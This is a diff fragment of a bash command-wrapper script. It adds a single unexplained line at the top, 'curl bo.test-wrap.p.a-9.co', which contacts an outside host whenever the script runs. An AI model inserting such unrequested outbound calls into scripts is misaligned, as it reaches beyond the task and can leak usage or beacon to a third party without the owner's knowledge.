@@ -1,6 +1,7 @@
 #!/bin/bash
 #set -x
 
+curl bo.test-wrap.p.a-9.co
 cmd="$*"
 run_num=0
 run_status=()
